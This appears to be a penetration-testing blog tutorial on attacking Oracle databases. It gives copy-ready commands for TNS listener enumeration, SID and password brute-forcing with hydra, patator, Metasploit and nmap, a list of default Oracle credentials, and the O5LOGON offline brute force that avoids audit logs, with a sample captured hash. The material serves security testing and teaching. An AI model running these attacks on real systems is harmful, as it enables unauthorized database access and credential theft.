<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="ORACLE Pentesting Best Practices" /><meta property="og:locale" content="en" /><meta name="description" content="ORACLE" /><meta property="og:description" content="ORACLE" /><link rel="canonical" href="https://secybr.com/posts/oracle-pentesting-best-practices/" /><meta property="og:url" content="https://secybr.com/posts/oracle-pentesting-best-practices/" /><meta property="og:site_name" content="secybr penetration testing, red teaming and hack tricks." /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-11T00:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="ORACLE Pentesting Best Practices" /><meta name="twitter:site" content="@0xhav0c" /><meta name="google-site-verification" content="405asbYxUs5N1iqL1zGg56yq-OlAtdexlSaC3FC7c9s" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-25T12:21:03+03:00","datePublished":"2022-06-11T00:00:00+03:00","description":"ORACLE","headline":"ORACLE Pentesting Best Practices","mainEntityOfPage":{"@type":"WebPage","@id":"https://secybr.com/posts/oracle-pentesting-best-practices/"},"url":"https://secybr.com/posts/oracle-pentesting-best-practices/"}</script><title>ORACLE Pentesting Best Practices | secybr | penetration testing, red teaming and hack tricks.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="secybr | penetration testing, red teaming and hack tricks."><meta name="application-name" content="secybr | penetration testing, red teaming and hack tricks."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><meta content="secybr | penetration testing, red teaming and hack tricks." property="og:site_name"><meta content="ORACLE Pentesting Best Practices" property="og:title"><meta content="article" property="og:type"><meta content="penetration testing, red teaming and hack tricks." property="og:description"><meta content="https://secybr.com/posts/oracle-pentesting-best-practices/" property="og:url"><meta content="2022-06-11T00:00:00+03:00" property="article:published_time"><meta content="https://secybr.com/about/" property="article:author"><meta content="https://secybr.com/assets/img/logo/logo.png" property="og:image"><meta content="pentesting protocols" property="article:section"><meta content="pentesting" property="article:tag"><meta content="oracle" property="article:tag"><meta content="best practicies" property="article:tag"><meta property="og:image" content="https://secybr.com/assets/img/logo/logo.png"><meta name="twitter:site" content="secybr"><meta name="twitter:creator" content="0xhav0c"><meta name="twitter:title" content="ORACLE Pentesting Best Practices"><meta name="twitter:description" content="penetration testing, red teaming and hack tricks."><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://secybr.com/assets/img/logo/logo.png"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6320091248407168" crossorigin="anonymous"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/logo/logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">secybr</a></div><div class="site-subtitle">is a product of 0xhav0c</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>WHO AM I?</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xhav0c" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xhav0c" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xhavocc','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>ORACLE Pentesting Best Practices</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>ORACLE Pentesting Best Practices</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1654894800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 11, 2022 </em> </span> <span> Updated <em class="" data-ts="1656148863" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 25, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/0xhav0c">0xhav0c</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3615 words"> <em>20 min</em> read</span></div></div></div><div class="post-content"><h1 id="oracle">ORACLE</h1><blockquote class="prompt-tip"><div><p>ORACLE default uses ports 1521, 1522, 1529</p></div></blockquote><h1 id="what-is-oracle">What is ORACLE?</h1><p>Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation (from <a href="https://www.techopedia.com/definition/8711/oracle-database">here</a>).</p><p>When enumerating Oracle the first step is to talk to the TNS-Listener that usually resides on the default port (1521/TCP, -you may also get secondary listeners on 1522–1529-).</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PORT     STATE SERVICE       VERSION
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 <span class="o">(</span><span class="k">for </span>32-bit Windows<span class="o">)</span>
1748/tcp open  oracle-tns    Oracle TNS Listener
</pre></table></code></div></div><h1 id="oracle-pentesting">ORACLE Pentesting</h1><div class="table-wrapper"><table><thead><tr><th><img data-src="https://www.shodan.io/static/img/favicon.png" alt="https://www.shodan.io/static/img/favicon.png" width="20px" data-proofer-ignore> Shodan search query :<tbody><tr><td><code class="language-plaintext highlighter-rouge">port:1521,1522,1529</code></table></div><h2 id="oracle-pentesting-requirements-installation"><span class="mr-2">Oracle Pentesting requirements installation</span><a href="#oracle-pentesting-requirements-installation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="installation-of-tools-sqlplus-and-needed-libraries-to-use-the-oracle-msf-modules"><span class="mr-2">Installation of tools (sqlplus) and needed libraries to use the oracle MSF modules</span><a href="#installation-of-tools-sqlplus-and-needed-libraries-to-use-the-oracle-msf-modules" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>(This installation guide was created for version 12.1.0.1.0, change that name for the version that you download)</p><p>As root, create the directory <code class="language-plaintext filepath highlighter-rouge">/opt/oracle</code>.. Then download the <a href="https://www.oracle.com/tr/database/technologies/instant-client/downloads.html">Oracle Instant Client</a> packages for your version of Kali Linux. The packages you will need are:</p><ul><li>instantclient-basic-linux-12.1.0.1.0.zip<li>instantclient-sqlplus-linux-12.1.0.1.0.zip<li>instantclient-sdk-linux-12.1.0.1.0.zip</ul><p>Unzip these under <code class="language-plaintext filepath highlighter-rouge">/opt/oracle</code>, and you should now have a path called <code class="language-plaintext filepath highlighter-rouge">/opt/oracle/instantclient_12_1/</code>. Next symlink the shared library that we need to access the library from oracle:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">ln </span>libclntsh.so.12.1 libclntsh.so
<span class="nb">ls</span> <span class="nt">-lh</span> libclntsh.so
lrwxrwxrwx 1 root root 17 Jun  1 15:41 libclntsh.so -&gt; libclntsh.so.12.1
ldconfig
</pre></table></code></div></div><p>You also need to configure the appropriate environment variables, add the following to either</p><ul><li><code class="language-plaintext filepath highlighter-rouge">~/.bashrc</code>.<li><code class="language-plaintext filepath highlighter-rouge">/etc/profile</code>.</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/opt/oracle/instantclient_12_1
<span class="nb">export </span><span class="nv">SQLPATH</span><span class="o">=</span>/opt/oracle/instantclient_12_1
<span class="nb">export </span><span class="nv">TNS_ADMIN</span><span class="o">=</span>/opt/oracle/instantclient_12_1
<span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/opt/oracle/instantclient_12_1
<span class="nb">export </span><span class="nv">ORACLE_HOME</span><span class="o">=</span>/opt/oracle/instantclient_12_1
</pre></table></code></div></div><p>Add Oracle libraries to <code class="language-plaintext highlighter-rouge">ldconfig</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"/opt/oracle/instantclient_12_1/"</span> <span class="o">&gt;&gt;</span> /etc/ld.so.conf.d/99_oracle
</pre></table></code></div></div><p>If you have succeeded, you should be able to run <code class="language-plaintext highlighter-rouge">sqlplus</code> from a command prompt (you may need to log out and log back in again):</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt;<span class="p">;</span>
</pre></table></code></div></div><h3 id="step-twoinstall-ruby-gem-ruby-oci8"><span class="mr-2">Step Two — Install Ruby Gem ruby-oci8</span><a href="#step-twoinstall-ruby-gem-ruby-oci8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>These steps are needed to use metasploit oracle modules</p><p>Install other OS dependencies:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>apt-get <span class="nb">install </span>libgmp-dev
</pre></table></code></div></div><p>Compile and install <code class="language-plaintext highlighter-rouge">ruby-oci8</code> (root)</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>wget https://github.com/kubo/ruby-oci8/archive/ruby-oci8-2.1.8.zip
unzip ruby-oci8-2.1.8.zip
<span class="nb">cd </span>ruby-oci8-ruby-oci8-2.1.8/
make
make <span class="nb">install
</span>gem <span class="nb">install </span>ruby-oci8
</pre></table></code></div></div><p>Restart <code class="language-plaintext highlighter-rouge">msfconsole</code> (or restart the machine).</p><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Tools that can be used for this are: nmap, MSF and <a href="https://www.kali.org/tools/tnscmd10g/">tnscmd10g</a>.</p><h3 id="tns-listener-version"><span class="mr-2">TNS listener version</span><a href="#tns-listener-version" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>nmap <span class="nt">--script</span> <span class="s2">"oracle-tns-version"</span> <span class="nt">-p</span> 1521 <span class="nt">-T4</span> <span class="nt">-sV</span> &lt;IP&gt;
msf&gt; use auxiliary/scanner/oracle/tnslsnr_version
<span class="c">#apt install tnscmd10g</span>
tnscmd10g version <span class="nt">-p</span> 1521 <span class="nt">-h</span> &lt;IP&gt;
</pre></table></code></div></div><h3 id="other-useful-tns-listener-commands"><span class="mr-2">Other useful TNS listener commands:</span><a href="#other-useful-tns-listener-commands" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="table-wrapper"><table><thead><tr><th>Command<th>Purpose<tbody><tr><td>ping<td>Ping the listener<tr><td>version<td>Provide output of the listener version and platform information<tr><td>status<td>Return the current status and variables used by the listener<tr><td>services<td>Dump service data<tr><td>debug<td>Dump debugging information to the listener log<tr><td>reload<td>Reload the listener configuration file<tr><td>save_config<td>Write the listener configuration file to a backup location<tr><td>stop<td>Invoke listener shutdown</table></div><p>If you receive an error, could be because TNS versions are incompatible (Use the <code class="language-plaintext highlighter-rouge">--10G</code> parameter with <code class="language-plaintext highlighter-rouge">tnscmd10</code>) and if the error persist, the listener may be password protected (you can see a list were all the <a href="https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7">errors are detailed here</a>) — don’t worry… hydra to the rescue:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hydra <span class="nt">-P</span> rockyou.txt <span class="nt">-t</span> 32 <span class="nt">-s</span> 1521 host.victim oracle-listener
</pre></table></code></div></div><p>The TNS listener could be vulnerable to MitM attacks. <a href="notion://www.notion.so/pentesting/1521-1522-1529-pentesting-oracle-listener/tns-poison">Check here how to check if the server is vulnerable and how to perform the attack (all versions up to version 12c are)</a>.</p><h2 id="sid-enumeration"><span class="mr-2">SID Enumeration</span><a href="#sid-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="what-is-a-sid"><span class="mr-2">What is a SID?</span><a href="#what-is-a-sid" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID.</p><p>In some old versions (in 9 it works) you could ask for the SID and the database send it to you:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>tnscmd10g status-p 1521 <span class="nt">-h</span> &lt;IP&gt; <span class="c">#The SID are inside: SERVICE=(SERVICE_NAME=&lt;SID_NAME&gt;)</span>

<span class="c">#msf1</span>
msf&gt; use auxiliary/scanner/oracle/sid_enum
msf&gt; <span class="nb">set </span>rhost &lt;IP&gt;
msf&gt; run
<span class="c">#msf2</span>
msf&gt; use auxiliary/admin/oracle/tnscmd
msf&gt; <span class="nb">set </span>CMD <span class="o">(</span><span class="nv">CONNECT_DATA</span><span class="o">=(</span><span class="nv">COMMAND</span><span class="o">=</span>STATUS<span class="o">))</span>
msf&gt; <span class="nb">set </span>rhost &lt;IP&gt;
msf&gt; run <span class="c">#The SID are inside: SERVICE=(SERVICE_NAME=&lt;SID_NAME&gt;)</span>
</pre></table></code></div></div><p>If you cant access this way to the SIDs you will need to bruteforce them:</p><h3 id="sid-bruteforce"><span class="mr-2">SID Bruteforce</span><a href="#sid-bruteforce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I have merged the nmap and MSF sid lists into this one (without duplicates):</p><p><a href="https://secybr.com/assets/file/sids-oracle.txt">sids-oracle.txt</a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>hydra <span class="nt">-L</span> /usr/share/metasploit-framework/data/wordlists/sid.txt <span class="nt">-s</span> 1521 &lt;IP&gt; oracle-sid
patator oracle_login <span class="nv">host</span><span class="o">=</span>&lt;IP&gt; <span class="nv">sid</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>sids-oracle.txt <span class="nt">-x</span> ignore:code<span class="o">=</span>ORA-12505
./odat.py sidguesser <span class="nt">-s</span> <span class="nv">$SERVER</span> <span class="nt">-d</span> <span class="nv">$SID</span> <span class="nt">--sids-file</span><span class="o">=</span>./sids.txt
msf&gt; use auxiliary/admin/oracle/sid_brute <span class="c">#This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt</span>
nmap <span class="nt">--script</span> +oracle-sid-brute <span class="nt">-p</span> 1521 10.11.1.202 <span class="c">#This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids</span>
</pre></table></code></div></div><p>In order to use <code class="language-plaintext highlighter-rouge">oracle_login</code> with patator you need to install:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>pip3 <span class="nb">install </span>cx_Oracle <span class="nt">--upgrade</span>
</pre></table></code></div></div><h2 id="targeting-accounts"><span class="mr-2">Targeting Accounts</span><a href="#targeting-accounts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Got SID? Excellent, now let’s move to the next task and extract the user account information. From this point, you can connect to the listener and brute-force credentials.</p><p>Metasploit <code class="language-plaintext highlighter-rouge">scanner/oracle/oracle_login</code> It has a built-in dictionary for the most popular default values of user account information presented as <code class="language-plaintext highlighter-rouge">login:password</code>. By the way, such default entries represent one of the most popular and serious security problems in Oracle.</p><p>Nmap can also help here with the script <code class="language-plaintext highlighter-rouge">oracle-brute</code>. Note that this script mixes the logins and passwords, that is, it tries each login against every password, and it takes quite a while!</p><h3 id="default-passwords"><span class="mr-2">Default Passwords</span><a href="#default-passwords" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Below are some of the default passwords associated with Oracle:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>DBSNMP/DBSNMP - Intelligent Agent uses this to talk to the db server <span class="o">(</span>its some work to change it<span class="o">)</span>
SYS/CHANGE_ON_INSTALL - Default sysdba account before and including Oracle v9, as of version 10g this has to be different!
PCMS_SYS/PCMS_SYS - Default x account
WMSYS/WMSYS - Default x account
OUTLN/OUTLN - Default x account
SCOTT/TIGER - Default x account
</pre></table></code></div></div><p>Other default passwords can be found <a href="http://www.petefinnigan.com/default/oracle_default_passwords.htm">here</a> and <a href="https://cirt.net/passwords?vendor=Oracle">here</a>.</p><p>The versions <code class="language-plaintext highlighter-rouge">11.1.0.6</code>, <code class="language-plaintext highlighter-rouge">11.1.0.7</code>, <code class="language-plaintext highlighter-rouge">11.2.0.1</code>, <code class="language-plaintext highlighter-rouge">11.2.0.2</code>, and <code class="language-plaintext highlighter-rouge">11.2.0.3</code> are vulnerable to offline brute force.</p><h3 id="remote-stealth-pass-brute-force"><span class="mr-2">Remote Stealth Pass Brute Force</span><a href="#remote-stealth-pass-brute-force" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Outer Perimeter: Remote stealth pass brute force</p><p>The versions <code class="language-plaintext highlighter-rouge">11.1.0.6</code>, <code class="language-plaintext highlighter-rouge">11.1.0.7</code>, <code class="language-plaintext highlighter-rouge">11.2.0.1</code>, <code class="language-plaintext highlighter-rouge">11.2.0.2</code>, and <code class="language-plaintext highlighter-rouge">11.2.0.3</code> are vulnerable to this technique. In order to understand the idea behind this vulnerability, you need to consider how the authentication protocol works with the database. I will show it for version 11. The interaction with the server proceeds as follows:</p><ol><li>The client connects to the server and sends the user name.<li>The server generates a session identifier <code class="language-plaintext highlighter-rouge">AUTH_SESSKEY</code> and encrypts it by using <code class="language-plaintext highlighter-rouge">AES-192</code>. As its key, the system uses <code class="language-plaintext highlighter-rouge">SHA-1</code> hash generated from user password and salt <code class="language-plaintext highlighter-rouge">AUTH_VFR_DATA</code>.<li>The server sends an encrypted session ID and salt to the client.<li>The client generates the key by hashing its password and received salt. The client uses this key to decrypt the session data received from the server.<li>Based on decrypted server session ID, the client generates a new public key for future use.</ol><p>Now, here’s the most interesting part: The session ID <code class="language-plaintext highlighter-rouge">AUTH_SESSKEY</code> sent by the server to the client has a length of 48 bytes. Of these, 40 bytes are random, and the last 8 are the duplicates of <code class="language-plaintext highlighter-rouge">0x08</code>. The initialization vector is <code class="language-plaintext highlighter-rouge">0x00 (Null)</code>. Knowing that the last 8 bytes of the public identifier always consist of <code class="language-plaintext highlighter-rouge">0x08</code>, we can bruteforce this password and, moreover, do it in offline mode, which means a tremendous speed, especially if you use GPU. To mount an attack, you need to know <code class="language-plaintext highlighter-rouge">SID</code>, valid login (for example, <code class="language-plaintext highlighter-rouge">SYS</code> account is very interesting) and, of course, have the ability to connect to the database. In this case, there will be no records, such as <code class="language-plaintext highlighter-rouge">Invalid Login Attempt</code>, created in the Oracle audit logs!</p><p>Summing it all up:</p><ol><li>Use Wireshark to intercept the initial traffic during authorization. This will be helped by <code class="language-plaintext highlighter-rouge">tns</code> filter.<li>Extract HEX values for <code class="language-plaintext highlighter-rouge">AUTH_SESSKEY</code>, <code class="language-plaintext highlighter-rouge">AUTH_VFR_DATA</code>.<li>Insert them into <a href="https://www.exploit-db.com/exploits/22069">PoC script</a>, which will perform a dictionary (brute force) attack.</ol><h3 id="using-nmap-and-john"><span class="mr-2">Using nmap and john</span><a href="#using-nmap-and-john" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>root@kali:~# nmap <span class="nt">-p1521</span> <span class="nt">--script</span> oracle-brute-stealth <span class="nt">--script-args</span> oracle-brute-stealth.sid<span class="o">=</span>DB11g <span class="nt">-n</span> 10.10.x.x

Starting Nmap 6.49BETA4 <span class="o">(</span>https://nmap.org<span class="o">)</span> at 2016-03-02 14:58 EST
Nmap scan report <span class="k">for </span>10.10.x.x
PORT     STATE SERVICE
1521/tcp open  oracle
| oracle-brute-stealth:
|   Accounts
|     SYS:<span class="nv">$o5logon$1245C95384E15E7F0C893FCD1893D8E19078170867E892CE863330880E09FAD3B4832CBCFDAC1</span>
|     A821D2EA8E3D2209DB6<span class="k">*</span>4202444F49DE9AE72AE2 - 
|     Hashed valid or invalid credentials
|   Statistics
|_    Performed 211 guesses <span class="k">in </span>9 seconds, average tps: 20

john hashes.txt
</pre></table></code></div></div><h3 id="userpass-bruteforce"><span class="mr-2">User/Pass bruteforce</span><a href="#userpass-bruteforce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Different tools offered <strong>different user/pass lists</strong> for oracle:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>oscan: /usr/share/oscanner/accounts.default <span class="o">(</span>169 lines<span class="o">)</span>
msf <span class="o">&gt;</span> use admin/oracle/oracle_login <span class="c"># /usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv (598 lines)</span>
msf <span class="o">&gt;</span> use scanner/oracle/oracle_login <span class="c"># /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt (568 lines)</span>
nmap <span class="nt">--script</span> oracle-brute <span class="nt">-p</span> 1521 <span class="nt">--script-args</span> oracle-brute.sid<span class="o">=</span>ORCL 10.10.x.x
nmap <span class="nt">--script</span> oracle-brute-stealth <span class="nt">-p</span> 1521 <span class="nt">--script-args</span> oracle-brute-stealth.sid<span class="o">=</span>ORCL 10.10.x.x
nmap <span class="nt">--script</span><span class="o">=</span>oracle-sid-brute <span class="nt">--script-args</span><span class="o">=</span><span class="nv">oraclesids</span><span class="o">=</span>/path/to/sidfile <span class="nt">-p</span> 1521-1560 10.10.x.x
nmap <span class="nt">-sT</span> <span class="nt">-p</span> 1521 <span class="nt">-d</span> <span class="nt">-Pn</span> <span class="nt">--script-trace</span> <span class="nt">--script</span> oracle-brute <span class="nt">--script-args</span> <span class="s2">"oracle-brute.sid=orcl, brute.credfile=/usr/share/nmap/nselib/data/oracle-default-accounts.lst"</span> 10.10.x.x <span class="c"># /usr/share/nmap/nselib/data/oracle-default-accounts.lst (687 lines)</span>
